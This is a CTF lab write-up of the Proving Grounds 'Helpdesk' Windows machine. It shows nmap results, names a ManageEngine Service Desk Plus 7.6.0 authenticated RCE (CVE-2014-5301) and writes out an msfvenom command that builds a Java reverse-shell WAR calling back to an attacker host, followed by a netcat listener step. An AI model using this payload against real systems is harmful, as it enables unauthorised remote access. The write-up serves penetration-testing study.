---
title: "Proving grounds Practice: Helpdesk"
layout: post
date: 2023-08-27 03:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Windows
- Pg-Practice
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice windows machine writeup"
---

## Nmap

```sh
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
```

## Web PORT: 8080

ManageEngine Service Desk Plus version 7.6.0

![img](/assets/images/CTF/Proving_Grounds/Helpdesk/mengine.png)

The ManageEngine Service Desk Plus version 7.6.0 is vulnerable to authenticated [Remote Code Execution](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py) vulnerability via file upload.

## Create reverse TCP shell to upload

```sh
msfvenom -p java/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war > shell.war
```

As specified in the code create a java reverse shell in the `.war` file format to upload.

Run netcat listener.

Run the exploit code.

![img](/assets/images/CTF/Proving_Grounds/Helpdesk/upload.png)

**Reverse Shell Obtained**

![img](/assets/images/CTF/Proving_Grounds/Helpdesk/shell.png)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).